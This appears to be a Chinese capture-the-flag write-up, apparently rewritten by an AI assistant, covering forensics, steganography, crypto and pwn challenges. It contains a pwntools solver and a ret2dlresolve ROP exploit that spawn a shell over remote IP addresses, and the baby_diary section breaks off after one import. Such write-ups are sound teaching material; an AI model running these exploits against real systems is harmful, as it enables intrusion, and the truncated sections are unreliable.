### BitLocker 文件卷加密恢复

**恢复密钥：**
```
221628-533357-667392-449185-516428-718443-190674-375100
```

**恢复密钥 ID:**
```
168F1291-82C1-4B
```

**整体恢复密钥 ID:**
```
168F1291-82C1-4BF2-B634-9CCCEC63E9ED
```

**说明：**
- 使用 DiskGenius 打开 BitLocker 加密的文件卷。
- 输入上述恢复密钥即可解锁。
- 解锁后，找到 `readme` 文件，该文件即为 flag。

### 0x02 MISC Blue Teaming

**步骤：**
1. 解压文件并使用十六进制编辑器打开，发现 `7z` 文件头。
2. 解压得到 `mem.dump` 文件。
3. 使用 Volatility 工具查看文件，查找与 PowerShell 相关的信息。
4. 导出 `evtx` 格式的日志文件，发现两段 PowerShell 代码。
5. 使用 WinHex 查看文件，结合进程“申请注册表”，发现一段代码：
   ```plaintext
   HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication
   ```

### 0x03 ExtremlySlow

**步骤：**
1. 从流量中提取 `latest` 文件，并根据 `content-range` 字段重新组合。
2. 使用 010 Editor 打开 `latest` 文件，确认其为 `pyc` 文件（Python 编译后的字节码），版本为 3.10 以上。
3. 修改 `unpyc` 工具，添加 `GEN_START` 并修复字典相关字节码处理，成功反编译出源码。
4. 分析源码，需要输入 26 个字节的数据。
5. 打印 RC4 密钥 `m` 得到 `[stegosaurus]` 字符串，推测为 `pyc` 隐写。
6. 使用 `stegosaurus` 工具解出 26 字节数据，输入后打印 `c` 即可得到 flag。

**源码示例：**
```python
import sys
from hashlib import sha256

MOD = 256

def KSA(key):
    key_length = len(key)
    S = list(range(MOD))
    j = 0
    for i in range(MOD):
        j = (j + S[i] + key[i % key_length]) % MOD
        S[i], S[j] = S[j], S[i]
    return S

def PRGA(S):
    i = 0
    j = 0
    while True:
        i = (i + 1) % MOD
        j = (j + S[i]) % MOD
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % MOD]
        yield K

def RC4(key):
    S = KSA(key)
    return PRGA(S)

def xor(p, stream):
    return bytes(map(lambda x: x ^ stream.__next__(), p))

if __name__ == '__main__':
    w = b'\xf6\xef\x10H\xa9\x0f\x9f\xb5\x80\xc1xd\xae\xd3\x03\xb2\x84\xc2\xb4\x0e\xc8\xf3<\x151\x19\n\x8f'
    e = b'$\r9\xa3\x18\xddW\xc9\x97\xf3\xa7\xa8R~'
    b = b'geo'
    s = b'}\xce`\xbej\xa2\x120\xb5\x8a\x94\x14{\xa3\x86\xc8\xc7\x01\x98\xa3_\x91\xd8\x82T*V\xab\xe0\xa1\x141'
    t = b"Q_\xe2\xf8\x8c\x11M}'<@\xceT\xf6?_m\xa4\xf8\xb4\xea\xca\xc7:\xb9\xe6\x06\x8b\xeb\xfabH\x85xJ3$\xdd\xde\xb6\xdc\xa0\xb8b\x961\xb7\x13=\x17\x13\xb1"
    m = {2: 115, 8: 97, 11: 117, 10: 114}
    n = {3: 119, 7: 116, 9: 124, 12: 127}
    m |= {x: x ^ n[x] for x in n}
    m |= ((i.bit_count(), i) for i in b)
    stream = RC4(list(map(lambda x: x[1], sorted(m.items()))))
    print(xor(w, stream).decode())
    p = sys.stdin.buffer.read(26)
    e = xor(e, stream)
    c = xor(p, stream)
    if sha256(c).digest() == s:
        print(xor(t, stream).decode())
    else:
        print(e.decode())
```

### 0x04 ISO1995

**步骤：**
1. 打开 ISO 文件，观察发现新的 `flagfolder` 的时间戳是错误的。
2. 时间戳 `fffffff` 后的数值不同，可以修改并排序。
3. 排序后，将相应指向的字符拼起来，找到 flag。
4. `from.txt` 文件存储 `fffffff` 后的两个字节，手动提取很方便。

**代码示例：**
```python
file = open("tail", "rb")
src = file.read()
out = []
length = len(src)
for i in range(0, length):
    if src[i] != 0:
        out.append(src[i])
for i in out:
    print(chr(i), end='')

two = []
f = open("from.txt", "r").read().split()
for i in f:
    two.append(int(i, 16))
for i in two:
    print(chr(out[i]), end='')
```

### 0x05 EzTime

**步骤：**
1. 使用工具 `NTFS Log Tracker V1.2.exe` 打开题目提供的两个文件，导出 `LogFile.csv`。
2. 找到访问时间早于修改时间的文件。
3. 提交文件名即可。

**示例：**
```
2286333 {45EF6FFC-F0B6-4000-A7C0-8D1549355A8C}.png
{45EF6FFC-F0B6-4000-A7C0-8D1549355A8C}.png 2021/5/23 0:28 2021/5/23 0:32
2021/5/23 0:28 Update Resident Value 0x25 0
```

### CRY - guess_game

**步骤：**
1. 每个不同的 `guess` 值会让第一个序列和第二个序列出现差距的特征不一样。
2. 在本地运行多次统计出固定的特征值。
3. 将接收的数据和本地运行的数据进行对比，确定 `guess` 值。

**代码示例：**
```python
from pwn import *
from hashlib import *
import random
import string
import hashlib
import sys
from collections import deque

class generator:
    def __init__(self, key: list, iv: list, hint: bool, k=0, m=0):
        self.NFSR = deque()
        self.LFSR = deque()
        for i in range(80):
            self.NFSR.append(key[i])
        for i in range(64):
            self.LFSR.append(iv[i])
        for i in range(64, 80):
            self.LFSR.append(1)
        self.clock()
        if hint:
            s = self.NFSR + self.LFSR
            for i in range(k, k + m):
                s[i] ^= 1
            self.NFSR = deque(list(s)[:80])
            self.LFSR = deque(list(s)[80:])

    def clock(self):
        for i in range(160):
            zi = self.PRGA()
            self.NFSR[79] ^= zi
            self.LFSR[79] ^= zi

    def PRGA(self):
        x0 = self.LFSR[3]
        x1 = self.LFSR[25]
        x2 = self.LFSR[46]
        x3 = self.LFSR[64]
        x4 = self.NFSR[63]
        hx = x1 ^ x4 ^ (x0 & x3) ^ (x2 & x3) ^ (x3 & x4) ^ (x0 & x1 & x2) ^ (x0 & x2 & x3) \
             ^ (x0 & x2 & x4) ^ (x1 & x2 & x4) ^ (x2 & x3 & x4)
        zi = (self.NFSR[1] ^ self.NFSR[2] ^ self.NFSR[4] ^ self.NFSR[10] ^ self.NFSR[31] ^ self.NFSR[43] ^ self.NFSR[
            56]) ^ hx
        fx = self.LFSR[62] ^ self.LFSR[51] ^ self.LFSR[38] ^ self.LFSR[23] ^ self.LFSR[13] ^ self.LFSR[0]
        gx = self.LFSR[0] ^ self.NFSR[62] ^ self.NFSR[60] ^ self.NFSR[52] ^ self.NFSR[45] ^ self.NFSR[37] \
             ^ self.NFSR[33] ^ self.NFSR[28] ^ self.NFSR[21] ^ self.NFSR[14] ^ self.NFSR[9] ^ self.NFSR[0] \
             ^ (self.NFSR[63] & self.NFSR[60]) ^ (self.NFSR[37] & self.NFSR[33]) ^ (self.NFSR[15] & self.NFSR[9]) \
             ^ (self.NFSR[60] & self.NFSR[52] & self.NFSR[45]) ^ (self.NFSR[33] & self.NFSR[28] & self.NFSR[21]) \
             ^ (self.NFSR[63] & self.NFSR[45] & self.NFSR[28] & self.NFSR[9]) ^ (
                     self.NFSR[60] & self.NFSR[52] & self.NFSR[37] & self.NFSR[33]) \
             ^ (self.NFSR[63] & self.NFSR[60] & self.NFSR[21] & self.NFSR[15]) ^ (
                     self.NFSR[63] & self.NFSR[60] & self.NFSR[52] & self.NFSR[45] & self.NFSR[37]) \
             ^ (self.NFSR[33] & self.NFSR[28] & self.NFSR[21] & self.NFSR[15] & self.NFSR[9]) ^ (
                     self.NFSR[52] & self.NFSR[45] & self.NFSR[37] & self.NFSR[33] & self.NFSR[28] & self.NFSR[21])
        self.LFSR.popleft()
        self.LFSR.append(fx)
        self.NFSR.popleft()
        self.NFSR.append(gx)
        return zi

def f():
    m1 = []
    m2 = []
    for kk in range(160):
        r = (2 ** 160) - 1
        s = (2 ** 160) - 1
        for j in range(20):
            guess = kk
            k = guess // 2
            m = guess % 10
            if m == 0:
                m = 10
            key = bin(random.getrandbits(80))[2:].zfill(80)
            key = list(map(int, key))
            iv = bin(random.getrandbits(64))[2:].zfill(64)
            iv = list(map(int, iv))
            a = generator(key, iv, False)
            k1 = []
            for i in range(160):
                k1.append(a.PRGA())
            k1 = int("".join(list(map(str, k1))), 2)
            b = generator(key, iv, True, k, m)
            k2 = []
            for i in range(160):
                k2.append(b.PRGA())
            k2 = int("".join(list(map(str, k2))), 2)
            r = r & (k1 ^ k2)
            s = s & (((2 ** 160) - 1) - k1 ^ k2)
        r = bin(r)[2:].zfill(160)
        s = bin(s)[2:].zfill(160)
        l = []
        for p in range(160):
            if r[p] == '1':
                l.append(p)
        m1.append(l)
        l = []
        for p in range(160):
            if s[p] == '1':
                l.append(p)
        m2.append(l)
    return m1, m2

m1, m2 = f()

def fd(s, m1, m2):
    flag1 = 1
    for i in range(160):
        flag = 1
        tar = m1[i]
        for j in tar:
            if s[j] != '1':
                flag = 0
                break
        tar = m2[i]
        for j in tar:
            if s[j] != '0':
                flag = 0
                break
        if flag:
            return i

def att(s, f):
    c = []
    for i in range(26):
        c.append(chr(i + 0x41))
        c.append(chr(i + 0x61))
    for i in range(10):
        c.append(chr(0x30 + i))
    for i in c:
        for j in c:
            for k in c:
                for m in c:
                    t = i + j + k + m
                    if sha256(t.encode() + s).hexdigest() == f.decode():
                        return t

sh = remote("39.105.139.103", "10002")
a = sh.recv()
sh.sendline(att(a[14:30], a[35:99]))
for i in range(32):
    print(sh.recv().decode())
    print(sh.recvuntil("your:\n").decode())
    a = int(sh.recvuntil("\n", drop=True).decode(), 10)
    b = int(sh.recvuntil("\n", drop=True).decode(), 10)
    s = bin(a ^ b)[2:].zfill(160)
    sh.sendline(fd(s, m1, m2))
print(sh.recv())
```

### PWN - no_output

**步骤：**
1. 使用 `ret2_dlresolve` 技术。
2. 构造 payload，利用 ROP 技术调用 `read` 和 `dl_resolve_call` 函数。
3. 通过 `dl_resolve_data` 构造假数据，最终调用 `system` 函数执行 `/bin/sh`。

**代码示例：**
```python
from roputils import *
from pwn import process, remote
from pwn import gdb
from pwn import context

# r = process('./no_input')
r = remote('39.105.138.97', 1234)
context.log_level = 'debug'

dynstr = 0x08048318
payload = p32(0x0804C084)
payload = payload.ljust(0x30, b'a')
r.send(payload)

payload = '\x00ello_boy'.ljust(0x20, 'a')
r.send(payload)
r.sendline("-2147483648")
r.sendline('-1')

rop = ROP('./no_input')
offset = 0x48 + 4
bss_base = rop.section('.bss')
buf = rop.fill(offset)
buf += rop.call('read', 0, bss_base, 100)
buf += rop.dl_resolve_call(bss_base + 20, bss_base)
r.send(buf)

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
buf += rop.dl_resolve_data(bss_base + 20, 'system')
buf += rop.fill(100, buf)
r.send(buf)

r.interactive()
```

### 0x02 baby_diary

**说明：**
- 利用 off-by-null 构造漏洞。
- 利用 largebin 中残留的指针进行攻击。
- 需要进行小范围爆破。

**代码示例：**
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from PwnContext import *
```

希望这些优化后的文本能够帮助你更好地理解和操作。如果有任何进一步的问题或需要更多帮助，请随时告诉我！